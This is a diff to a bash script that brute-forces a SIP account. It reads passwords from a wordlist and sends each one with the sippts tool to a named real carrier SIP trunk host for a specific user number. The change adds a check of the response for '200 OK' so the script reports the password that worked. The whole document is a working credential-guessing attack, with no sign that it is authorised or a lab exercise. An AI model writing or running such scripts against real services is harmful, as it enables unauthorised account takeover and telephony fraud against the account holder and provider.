@@ -10,8 +10,8 @@ fi
 while IFS= read -r password; do
     echo "Trying password: $password"
     
-    # Execute the sippts command with the current password
-    python3 ./build/scripts-3.12/sippts send \
+    # Execute the sippts command with the current password and capture the output
+    output=$(python3 ./build/scripts-3.12/sippts send \
     -i siptrunk2.ver.sul.t-online.de \
     -r 5060 \
     -p tcp \
@@ -24,6 +24,15 @@ while IFS= read -r password; do
     -user 550214025190 \
     -pass "$password" \
     -v \
-    -d siptrunk2.ver.sul.t-online.de
+    -d siptrunk2.ver.sul.t-online.de)
+
+    # Check if the output contains "200 OK"
+    if echo "$output" | grep -q "200 OK"; then
+        echo "PASSWORD FOUND: $password"
+        exit 0
+    fi
 
 done < wordlist.txt
+
+echo "Password not found in the wordlist."
+exit 1
